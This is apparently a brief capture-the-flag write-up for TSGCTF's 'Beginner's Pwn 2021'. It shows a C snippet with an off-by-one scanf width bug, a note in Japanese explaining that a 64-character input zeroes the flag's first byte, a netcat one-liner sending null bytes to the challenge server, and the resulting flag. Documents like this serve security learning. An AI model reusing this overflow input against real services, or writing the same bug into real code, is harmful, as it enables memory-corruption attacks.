# Beginner's Pwn 2021  
```c
    scanf("%64s", your_try);

    if (strncmp(your_try, flag, length) == 0) {
        puts("yes");
        win();
    } else {
```
64文字入力するとflagの先頭が0になる  
```
$ (python -c "print('\x00'*64)";cat) | nc 34.146.101.4 30007
```
flag: `TSGCTF{just_a_simple_off_by_one-chall_isnt_it}`  
